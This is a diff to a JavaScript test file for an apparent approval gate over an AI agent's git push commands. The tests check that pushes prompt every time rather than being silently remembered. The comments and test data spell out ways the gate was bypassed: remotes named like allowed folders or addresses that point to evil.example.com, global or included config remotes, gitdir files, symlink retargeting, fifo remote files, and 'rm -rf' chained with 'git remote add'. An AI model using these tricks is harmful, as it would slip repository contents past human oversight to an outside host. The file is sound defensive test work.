@@ -234,11 +234,17 @@ try {
 
     // F6 — a remote name with `/` was read as a folder: `foo/bar` allowed as a local folder, then
     // `rm -rf foo && git remote add foo/bar https://evil…` and `git push foo/bar` ran silently to evil.
+    // Verify r4/r5 (B3–B5, C1–C3): which repository git enters for a folder address (`<p>/.git`, `gitdir:` files, `.git`
+    // suffixes, links, `~`, the worktree top for a relative path) can be changed by a command, so a push to a folder on
+    // this computer now asks every time and is never remembered.
+    const askedAlways = async (c, label) => {
+      const first = await asked(c, work, "허락");
+      assert.deepEqual([first.modals, first.prompt?.outward], [1, { destinations: [], remembers: false }], `${label}: asks and says it will ask again`);
+      assert.equal((await asked(c, work, undefined)).modals, 1, `${label}: never remembered`);
+    };
     fs.mkdirSync(path.join(work, "foo"));
     git(work, "init", "-q", "--bare", "foo/bar");
-    r = await asked("git push foo/bar HEAD:refs/heads/x", work, "허락");
-    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [`file://${work}/foo/bar`]], "F6: a local folder push asks once for the folder");
-    assert.equal((await asked("git push foo/bar HEAD:refs/heads/x", work, undefined)).modals, 0, "control: the same folder is remembered");
+    await askedAlways("git push foo/bar HEAD:refs/heads/x", "F6: a local folder");
     fs.rmSync(path.join(work, "foo"), { recursive: true, force: true });
     git(work, "remote", "add", "foo/bar", "https://evil.example.com/x.git");
     r = await asked("git push foo/bar HEAD:refs/heads/x", work, undefined);
@@ -248,34 +254,34 @@ try {
       r = await asked(`git push ${name}`, work, undefined);
       assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [url.replace(/\.git$/, "")]], `F6: remote ${name} resolves to its address`);
     }
-    r = await asked("git push nosuch/x", work, "허락");
-    assert.deepEqual([r.modals, r.prompt?.outward], [1, { destinations: [], remembers: false }], "F6: neither a remote nor an existing folder: asks and says it will ask again");
-    assert.equal((await asked("git push nosuch/x", work, undefined)).modals, 1, "F6: never remembered");
+    await askedAlways("git push nosuch/x", "F6: neither a remote nor a folder");
+    const lorig = path.join(tmp, "lorig.git");
+    git(tmp, "init", "-q", "--bare", lorig);
+    git(work, "remote", "add", "lo", lorig);
+    for (const c of ["git push lo HEAD:refs/heads/x", `git push ${lorig} HEAD:refs/heads/x`, `git push file://${lorig} HEAD:refs/heads/x`, "git push ../lorig.git HEAD:refs/heads/x", "git push ~/x HEAD:refs/heads/x", "git push file:///x/%zz HEAD:refs/heads/x"]) {
+      await askedAlways(c, `B3–B5/C1–C3: ${c}`);
+    }
+    git(work, "remote", "remove", "lo");
+    ok("verify r2–r5 F6: a push word is looked up as a remote first (slashes, dots, case); a folder on this computer asks every time");
+
     // F7 (verify r3, head 9a09316b3) — `remote get-url` answers only for the repository's own remotes; git push also uses
-    // one defined only in the global config or an include, so a word allowed as a folder or an address can be taken over.
-    fs.mkdirSync(path.join(work, "loc"));
-    git(work, "init", "-q", "--bare", "loc/r");
-    r = await asked("git push loc/r HEAD:refs/heads/x", work, "허락");
-    assert.equal(r.modals, 1, "F7 control: a local folder asks once");
-    assert.equal((await asked("git push loc/r HEAD:refs/heads/x", work, undefined)).modals, 0, "F7 control: then silent");
+    // one defined only in the global config or an include, so a word allowed as an address can be taken over.
     r = await asked("git push git@github.com:learner/work.git", work, "허락");
     assert.equal(r.modals, 1, "F7 control: a written-out address asks once");
     assert.equal((await asked("git push git@github.com:learner/work.git", work, undefined)).modals, 0, "F7 control: then silent");
     const inc = path.join(tmp, "remote.inc");
-    for (const [label, word, body, useInclude] of [
-      ["global remote named like an allowed folder", "loc/r", '[remote "loc/r"]\n\turl = https://evil.example.com/g.git\n', false],
-      ["global remote named like an allowed address", "git@github.com:learner/work.git", '[remote "git@github.com:learner/work.git"]\n\turl = https://evil.example.com/h.git\n', false],
-      ["remote from a globally included file", "loc/r", '[remote "loc/r"]\n\tpushurl = https://evil.example.com/i.git\n', true],
+    for (const [label, body, useInclude] of [
+      ["global remote named like an allowed address", '[remote "git@github.com:learner/work.git"]\n\turl = https://evil.example.com/h.git\n', false],
+      ["remote from a globally included file", '[remote "git@github.com:learner/work.git"]\n\tpushurl = https://evil.example.com/i.git\n', true],
     ]) {
       if (useInclude) { fs.writeFileSync(inc, body); fs.writeFileSync(globalCfg, `[include]\n\tpath = ${inc}\n`); } else fs.writeFileSync(globalCfg, body);
       env.GIT_CONFIG_GLOBAL = globalCfg;
-      const c = word === "loc/r" ? "git push loc/r HEAD:refs/heads/x" : `git push ${word}`;
-      r = await asked(c, work, "허락");
-      assert.deepEqual([r.modals, r.prompt?.outward], [1, { destinations: [], remembers: false }], `F7: ${label}: asks and says it will ask again`);
-      assert.equal((await asked(c, work, undefined)).modals, 1, `F7: ${label}: never remembered`);
+      await askedAlways("git push git@github.com:learner/work.git", `F7: ${label}`);
       env.GIT_CONFIG_GLOBAL = "/dev/null";
-      assert.equal((await asked(c, work, undefined)).modals, 0, `F7 control: ${label} removed, silent again`);
+      assert.equal((await asked("git push git@github.com:learner/work.git", work, undefined)).modals, 0, `F7 control: ${label} removed, silent again`);
     }
+    ok("verify r3 F7: a remote defined only in global or included config asks every time");
+
     // Verify r4 (head fc8f45c10), each ran silently and delivered there:
     // B1 — a tag named like the branch made `symbolic-ref --short` print `heads/main`, so the branch's pushRemote was
     // missed and the bare push was keyed by the remembered origin.
@@ -286,39 +292,18 @@ try {
     r = await asked("git push", work, undefined);
     assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["https://evil.example.com/b1"]], "B1: an ambiguous branch name still reads the branch's pushRemote: asks for it");
     git(work, "config", "--unset", "branch.main.pushRemote"); git(work, "tag", "-d", "main");
-    // B2 — a legacy remotes file that reads empty (a fifo) made `get-url` answer the bare name, read as the allowed folder.
-    git(work, "init", "-q", "--bare", "lf");
-    assert.equal((await asked("git push lf HEAD:refs/heads/x", work, "허락")).modals, 1, "B2 control: the folder asks once");
-    assert.equal((await asked("git push lf HEAD:refs/heads/x", work, undefined)).modals, 0, "B2 control: then silent");
+    // B2 — a legacy remotes file that reads empty (a fifo) made `get-url` answer the bare name.
+    git(work, "remote", "add", "lf2", "https://github.com/learner/lf2.git");
+    assert.equal((await asked("git push lf2", work, "허락")).modals, 1, "B2 control: the remote asks once");
+    assert.equal((await asked("git push lf2", work, undefined)).modals, 0, "B2 control: then silent");
     fs.mkdirSync(path.join(work, ".git", "remotes"), { recursive: true });
-    execFileSync("mkfifo", [path.join(work, ".git", "remotes", "lf")]);
-    assert.equal((await asked("git push lf HEAD:refs/heads/x", work, undefined)).modals, 1, "B2: a legacy remotes file of that name asks");
+    execFileSync("mkfifo", [path.join(work, ".git", "remotes", "lf2")]);
+    assert.equal((await asked("git push lf2", work, undefined)).modals, 1, "B2: a legacy remotes file of that name asks");
     fs.rmSync(path.join(work, ".git", "remotes"), { recursive: true, force: true });
-    // B3–B5 — a local address was keyed by its written path with `.git`/`?`/`#` stripped and links unresolved; git enters
-    // `<p>/.git` first (following a `gitdir:` file) and the real folder.
-    const lorig = path.join(tmp, "lorig.git");
-    git(tmp, "init", "-q", "--bare", lorig);
-    git(work, "remote", "add", "lo", lorig);
-    r = await asked("git push lo HEAD:refs/heads/x", work, "허락");
-    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [`file://${lorig}`]], "B3 control: a local remote asks once, keyed by its real folder");
-    assert.equal((await asked("git push lo HEAD:refs/heads/x", work, undefined)).modals, 0, "B3 control: then silent");
-    git(tmp, "init", "-q", "--bare", path.join(tmp, "evil-local.git"));
-    fs.writeFileSync(path.join(lorig, ".git"), `gitdir: ${path.join(tmp, "evil-local.git")}\n`);
-    assert.equal((await asked("git push lo HEAD:refs/heads/x", work, undefined)).modals, 1, "B3: a `.git` file inside the allowed folder redirects git: asks");
-    fs.rmSync(path.join(lorig, ".git"));
-    git(tmp, "init", "-q", "--bare", path.join(tmp, "lorig"));
-    git(work, "remote", "set-url", "lo", path.join(tmp, "lorig"));
-    r = await asked("git push lo HEAD:refs/heads/x", work, undefined);
-    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [`file://${path.join(tmp, "lorig")}`]], "B4: `lorig` is another folder than `lorig.git`: asks");
-    fs.symlinkSync(lorig, path.join(tmp, "llink"));
-    git(work, "remote", "set-url", "lo", path.join(tmp, "llink"));
-    assert.equal((await asked("git push lo HEAD:refs/heads/x", work, undefined)).modals, 0, "B5 control: a link to the allowed folder is that folder");
-    fs.unlinkSync(path.join(tmp, "llink")); fs.symlinkSync(path.join(tmp, "evil-local.git"), path.join(tmp, "llink"));
-    assert.equal((await asked("git push lo HEAD:refs/heads/x", work, undefined)).modals, 1, "B5: the link retargeted elsewhere asks");
-    git(work, "remote", "remove", "lo");
-    ok("verify r4: ambiguous branch names, legacy remote files, gitdir files, .git suffixes and links no longer reuse an allowed destination");
-
-    ok("verify r2 F6: a push word is looked up as a remote first (slashes, dots, case); otherwise only an anchored or existing folder");
+    // C4 (verify r5) — `git pull` rewrites checked-out files (a tracked link, an included config) after the decision.
+    assert.equal((await asked("git fetch origin && git push origin", work, undefined)).modals, 0, "C4 control: fetch before a remembered push stays silent");
+    for (const c of ["git pull && git push origin", "git pull --ff-only origin main && git push origin"]) assert.equal((await asked(c, work, undefined)).modals, 1, `C4: ${c} asks`);
+    ok("verify r4/r5: ambiguous branch names, legacy remote files and a pull before the push ask");
   }
 
   // ── 2. runSdkCoach: the PreToolUse hook's cwd reaches the approval as shellCwd ──
